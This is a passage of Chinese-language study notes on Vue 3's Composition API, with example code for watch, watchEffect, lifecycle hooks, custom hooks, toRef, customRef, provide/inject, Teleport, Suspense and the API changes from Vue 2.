- 与Vue2.x中watch配置功能一致

- 两个小“坑”：

  - 监视reactive定义的响应式数据时：oldValue无法正确获取、强制开启了深度监视（deep配置失效）。
  - 监视reactive定义的响应式数据中某个属性时：deep配置有效。

  ```js
  //情况一：监视ref定义的响应式数据
  watch(sum,(newValue,oldValue)=>{
  	console.log('sum变化了',newValue,oldValue)
  },{immediate:true})
  
  //情况二：监视多个ref定义的响应式数据
  watch([sum,msg],(newValue,oldValue)=>{
  	console.log('sum或msg变化了',newValue,oldValue)
  }) 
  
  /* 情况三：监视reactive定义的响应式数据
  			若watch监视的是reactive定义的响应式数据，则无法正确获得oldValue！！
  			若watch监视的是reactive定义的响应式数据，则强制开启了深度监视 
  */
  watch(person,(newValue,oldValue)=>{
  	console.log('person变化了',newValue,oldValue)
  },{immediate:true,deep:false}) //此处的deep配置不再奏效
  
  //情况四：监视reactive定义的响应式数据中的某个属性
  watch(()=>person.job,(newValue,oldValue)=>{
  	console.log('person的job变化了',newValue,oldValue)
  },{immediate:true,deep:true}) 
  
  //情况五：监视reactive定义的响应式数据中的某些属性
  watch([()=>person.job,()=>person.name],(newValue,oldValue)=>{
  	console.log('person的job变化了',newValue,oldValue)
  },{immediate:true,deep:true})
  watch(()=>[person.name,person.age],(newValue,oldValue)=>{
      console.log('person的name或age变化了',newValue,oldValue)
  }) 
  //特殊情况
  watch(()=>person.job,(newValue,oldValue)=>{
      console.log('person的job变化了',newValue,oldValue)
  },{deep:true}) //此处由于监视的是reactive素定义的对象中的某个属性，所以deep配置有效
  ```

  

### watchEffect函数

- watch的套路是：既要指明监视的属性，也要指明监视的回调。

- watchEffect的套路是：不用指明监视哪个属性，监视的回调中用到哪个属性，那就监视哪个属性。

- watchEffect有点像computed：

  - 但computed注重的计算出来的值（回调函数的返回值），所以必须要写返回值。
  - 而watchEffect更注重的是过程（回调函数的函数体），所以不用写返回值。

  ```js
  //watchEffect所指定的回调中用到的数据只要发生变化，则直接重新执行回调。
  watchEffect(()=>{
      const x1 = sum.value
      const x2 = person.age
      console.log('watchEffect配置的回调执行了')
  })
  ```

  

## 10.9.Vue3的生命周期

<img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202310151844159.png"/>

- Vue3.0中可以继续使用Vue2.x中的生命周期钩子，但有有两个被更名：
  - ```beforeDestroy```改名为 ```beforeUnmount```
  - ```destroyed```改名为 ```unmounted```
- Vue3.0也提供了 Composition API 形式的生命周期钩子，与Vue2.x中钩子对应关系如下：
  - `beforeCreate`===>`setup()`
  - `created`=======>`setup()`
  - `beforeMount` ===>`onBeforeMount`
  - `mounted`=======>`onMounted`
  - `beforeUpdate`===>`onBeforeUpdate`
  - `updated` =======>`onUpdated`
  - `beforeUnmount` ==>`onBeforeUnmount`
  - `unmounted` =====>`onUnmounted`

```js
import {ref,onBeforeMount,onMounted,onBeforeUpdate,onUpdated,onBeforeUnmount,onUnmounted} from 'vue'
export default {
    name: 'VueDemo',

    setup(){
        console.log('---setup---')
        //数据
        let sum = ref(0)

        //通过组合式API的形式去使用生命周期钩子
        onBeforeMount(()=>{
            console.log('---onBeforeMount---')
        })
        onMounted(()=>{
            console.log('---onMounted---')
        })
        onBeforeUpdate(()=>{
            console.log('---onBeforeUpdate---')
        })
        onUpdated(()=>{
            console.log('---onUpdated---')
        })
        onBeforeUnmount(()=>{
            console.log('---onBeforeUnmount---')
        })
        onUnmounted(()=>{
            console.log('---onUnmounted---')
        })

        //返回一个对象（常用）
        return {sum}
    },
}
```



## 10.10. 自定义hook函数

- 什么是hook？—— 本质是一个函数，把setup函数中使用的**Composition API进行了封装**。

- 类似于vue2.x中的mixin。

- 自定义hook的优势: **复用代码**, 让setup中的逻辑更清楚易懂。

<img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202310151846775.png"/>

```js
import {reactive,onMounted,onBeforeUnmount} from 'vue'
export default function (){
	//实现鼠标“打点”相关的数据
	let point = reactive({
		x:0,
		y:0
	})
	//实现鼠标“打点”相关的方法
	function savePoint(event){
		point.x = event.pageX
		point.y = event.pageY
		console.log(event.pageX,event.pageY)
	}
	//实现鼠标“打点”相关的生命周期钩子
	onMounted(()=>{
		window.addEventListener('click',savePoint)
	})

	onBeforeUnmount(()=>{
		window.removeEventListener('click',savePoint)
	})
	return point
}
```

```vue
<template>
	<h2>当前求和为：{{sum}}</h2>
	<button @click="sum++">点我+1</button>
	<hr>
	<h2>当前点击时鼠标的坐标为：x：{{point.x}}，y：{{point.y}}</h2>
</template>

<script>
	import {ref} from 'vue'
	import usePoint from '../hooks/usePoint'
	export default {
		name: 'VueDemo',
		setup(){
			//数据
			let sum = ref(0)
			let point = usePoint()
			
			//返回一个对象（常用）
			return {sum,point}
		}
	}
</script>
```



## 10.11. toRef与toRefs

- 作用：创建一个 ref 对象，其value值指向另一个对象中的某个属性。
- 语法：```const name = toRef(person,'name')```
- 应用:   要将响应式对象中的某个属性单独提供给外部使用时。


- 扩展：```toRefs``` 与```toRef```功能一致，但可以批量创建多个 ref 对象，语法：```toRefs(person)```

```vue
<template>
  <h2>{{person}}</h2>
  <h2>姓名：{{name}}</h2>
  <h2>年龄：{{age}}</h2>
  <h2>薪资：{{salary}}</h2>
  <button @click="name+='~'">修改姓名</button>
  <button @click="age++">增长年龄</button>
  <button @click="salary++">增长薪资</button>
</template>
<script>
import {reactive, toRef, toRefs} from 'vue'
export default {
	name: 'VueDemo',
	setup(){
    let person = reactive({
      name:"张三",
      age:18,
      job:{
        j1:{
          salary:20
        }
      }
    })
    console.log(toRef(person,'name'))
    console.log(toRefs(person).name)
    return{
      person,
      name:toRef(person,"name"),
      age:toRef(person,"age"),
      salary:toRef(person.job.j1,"salary"),
      // ...toRefs(person)
    }
  }
};
</script>
```



# 第11章：其它 Composition API

## 11.1. shallowReactive 与 shallowRef

- shallowReactive：**只处理对象最外层属性**的响应式（浅响应式）。
- shallowRef：**只处理基本数据**类型的响应式, **不进行对象的响应式处理**。

- 什么时候使用?
  -  如果有一个对象数据，结构比较深, 但变化时只是外层属性变化 ===> shallowReactive。
  -  如果有一个对象数据，后续功能不会修改该对象中的属性，而是生新的对象来替换 ===> shallowRef。

## 11.2. readonly 与 shallowReadonly

- readonly: 让一个响应式数据变为只读的（深只读）。
- shallowReadonly：让一个响应式数据变为只读的（浅只读）。
- 应用场景: 不希望数据被修改时。

```js
let sum = ref(0)
let person = reactive({
    name:'张三',
    age:18,
    job:{
        j1:{
            salary:20
        }
    }
})
person = shallowReadonly(person)
sum = readonly(sum)
```

## 11.3. toRaw 与 markRaw

- toRaw：
  - 作用：将一个由```reactive```生成的<strong style="color:orange">响应式对象</strong>转为<strong style="color:orange">普通对象</strong>。
  - 使用场景：用于读取响应式对象对应的普通对象，对这个普通对象的所有操作，不会引起页面更新。
  - 语法：`let p = toRaw(person)`
- markRaw：
  - 作用：标记一个对象，使其永远不会再成为响应式对象。
  - 应用场景:
    1. 有些值不应被设置为响应式的，例如复杂的第三方类库等。
    2. 当渲染具有不可变数据源的大列表时，跳过响应式转换可以提高性能。
  - 语法：`person.car = markRaw(car)`

## 11.4. customRef

- 作用：创建一个自定义的 ref，并对其依赖项跟踪和更新触发进行显式控制。

- 实现防抖效果：

  ```js
  setup(){
      function myRef(value,delay){
          let timer
          //通过customRef去实现自定义
          return customRef((track,trigger)=>{
              return{
                  get(){
                      track() //告诉Vue这个value值是需要被“追踪”的
                      return value
                  },
                  set(newValue){
                      clearTimeout(timer)
                      timer = setTimeout(()=>{
                          value = newValue
                          trigger() //告诉Vue去更新界面
                      },delay)
                  }
              }
          })
      }
      let keyword = myRef('hello',500) //使用程序员自定义的ref
      return {
          keyword
      }
  }
  ```

  

## 11.5. provide 与 inject

<img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202310161804407.png"/>

- 作用：实现<strong style="color:#DD5145">祖与后代组件间</strong>通信

- 套路：父组件有一个 `provide` 选项来提供数据，后代组件有一个 `inject` 选项来开始使用这些数据

- 具体写法：

  1. 祖组件中：

     ```js
     setup(){
     	......
         let car = reactive({name:'奔驰',price:'40万'})
         provide('car',car)
         ......
     }
     ```

  2. 后代组件中：

     ```js
     setup(props,context){
     	......
         const car = inject('car')
         return {car}
     	......
     }
     ```

     

## 11.6. 响应式数据的判断

- **isRef**: 检查一个值是否为一个 ref 对象
- **isReactive**: 检查一个对象是否是由 `reactive` 创建的响应式代理
- **isReadonly**: 检查一个对象是否是由 `readonly` 创建的只读代理
- **isProxy**: 检查一个对象是否是由 `reactive` 或者 `readonly` 方法创建的代理



# 第12章：Composition API 的优势

## 12.1. Options API 存在的问题

使用传统OptionsAPI中，新增或者修改一个需求，就需要分别在data，methods，computed里修改 。

<div style="width:900px;height:400px;">
	<div style="width:500px;height:400px;overflow:hidden;float:left">
		<img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202310161840332.image" style="width:500px;height:400px;float:left" />
	</div>
	<div style="width:300px;height:400px;overflow:hidden;float:left">
		<img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202310161841080.image" style="width:400px;height:400px;float:left" /> 
	</div>
</div>



## 12.2. Composition API 的优势

我们可以更加优雅的组织我们的代码，函数。让相关功能的代码更加有序的组织在一起。

<div style="width:800px;height:340px;">
  <div style="width:400px;height:340px;overflow:hidden;float:left">
    <img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202310161901564.image"style="height:360px"/>
  </div>
  <div style="width:400px;height:340px;overflow:hidden;float:left">
    <img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202310161902753.image"style="height:360px"/>
  </div>
</div>



# 第13章：新的组件

## 13.1. Fragment

- 在Vue2中: 组件必须有一个根标签
- 在Vue3中: 组件可以没有根标签, 内部会将多个标签包含在一个Fragment虚拟元素中
- 好处: 减少标签层级, 减小内存占用



## 13.2. Teleport

什么是Teleport？—— `Teleport` 是一种能够将我们的<strong style="color:#DD5145">组件html结构</strong>移动到指定位置的技术。

```html
<teleport to="移动位置">
	<div v-if="isShow" class="mask">
		<div class="dialog">
			<h3>我是一个弹窗</h3>
			<button @click="isShow = false">关闭弹窗</button>
		</div>
	</div>
</teleport>
```



## 13.3. Suspense

- 等待异步组件时渲染一些额外内容，让应用有更好的用户体验

- 使用步骤：

  - 异步引入组件

    ```js
    import {defineAsyncComponent} from 'vue'
    const Child = defineAsyncComponent(()=>import('./components/Child.vue'))
    ```

  - 使用```Suspense```包裹组件，并配置好```default``` 与 ```fallback```

    ```vue
    <template>
    	<div class="app">
    		<h3>我是App组件</h3>
    		<Suspense>
    			<template v-slot:default>
    				<Child/>
    			</template>
    			<template v-slot:fallback>
    				<h3>加载中.....</h3>
    			</template>
    		</Suspense>
    	</div>
    </template>
    ```

# 第14章：其他

## 14.1. 全局API的转移

- Vue 2.x 有许多全局 API 和配置。

  - 例如：注册全局组件、注册全局指令等。

    ```js
    //注册全局组件
    Vue.component('MyButton', {
      data: () => ({
        count: 0
      }),
      template: '<button @click="count++">Clicked {{ count }} times.</button>'
    })
    
    //注册全局指令
    Vue.directive('focus', {
      inserted: el => el.focus()
    }
    ```

- Vue3.0中对这些API做出了调整：

  - 将全局的API，即：```Vue.xxx```调整到应用实例（```app```）上

    | 2.x 全局 API（```Vue```） | 3.x 实例 API (`app`)                        |
    | ------------------------- | ------------------------------------------- |
    | Vue.config.xxxx           | app.config.xxxx                             |
    | Vue.config.productionTip  | <strong style="color:#DD5145">移除</strong> |
    | Vue.component             | app.component                               |
    | Vue.directive             | app.directive                               |
    | Vue.mixin                 | app.mixin                                   |
    | Vue.use                   | app.use                                     |
    | Vue.prototype             | app.config.globalProperties                 |

## 14.2. 其他改变

- data选项应始终被声明为一个函数。

- 过度类名的更改：

  - Vue2.x写法

    ```css
    .v-enter,
    .v-leave-to {
      opacity: 0;
    }
    .v-leave,
    .v-enter-to {
      opacity: 1;
    }
    ```

  - Vue3.x写法

    ```css
    .v-enter-from,
    .v-leave-to {
      opacity: 0;
    }
    
    .v-leave-from,
    .v-enter-to {
      opacity: 1;
    }
    ```

- <strong style="color:#DD5145">移除</strong>keyCode作为 v-on 的修饰符，同时也不再支持```config.keyCodes```

- <strong style="color:#DD5145">移除</strong>```v-on.native```修饰符

  - 父组件中绑定事件

    ```vue
    <my-component
      v-on:close="handleComponentEvent"
      v-on:click="handleNativeClickEvent"
    />
    ```

  - 子组件中声明自定义事件

    ```vue
    <script>
      export default {
        emits: ['close']
      }
    </script>
    ```

- <strong style="color:#DD5145">移除</strong>过滤器（filter）

  > 过滤器虽然这看起来很方便，但它需要一个自定义语法，打破大括号内表达式是 “只是 JavaScript” 的假设，这不仅有学习成本，而且有实现成本！建议用方法调用或计算属性去替换过滤器。

- ......
